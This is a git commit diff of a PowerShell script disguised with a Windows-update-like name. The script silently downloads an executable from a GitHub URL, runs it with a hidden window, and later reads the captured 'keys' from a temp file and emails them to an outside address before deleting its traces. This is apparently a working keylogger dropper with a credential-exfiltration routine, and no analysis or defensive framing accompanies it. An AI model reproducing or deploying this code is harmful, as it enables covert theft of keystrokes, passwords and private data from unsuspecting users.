c2380b75ff08b5ad7ac97984c279f2d33d60eba0
Zachary Hales <51687053+SmartMozart@users.noreply.github.com>
2023-05-13 13:04:32 -0600

    Update wsuA58F.ps1

--- wsuA58F.ps1
+++ wsuA58F.ps1
@@ -1,8 +1,4 @@
 if (Test-Path "$env:temp\wsuA58F.tmp") {
-	New-Item "$env:temp\wsuA58F.tmp"
-	(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\wsuA58F.exe")
-	Start-Process "$env:temp\wsuA58F.exe" -WindowStyle hidden
-} else {
 	$From = "pshs1235@gmail.com"
 	$To = "zacsengines@yahoo.com"
 	$keys = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")
@@ -14,4 +10,8 @@ if (Test-Path "$env:temp\wsuA58F.tmp") {
 	taskkill -f -im wsuA58F.exe
 	Remove-Item "$env:temp\wsuA58F.tmp"
 	Remove-Item "$env:temp\wsuA58F.exe"
+} else {
+	New-Item "$env:temp\wsuA58F.tmp"
+	(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\wsuA58F.exe")
+	Start-Process "$env:temp\wsuA58F.exe" -WindowStyle hidden
 }
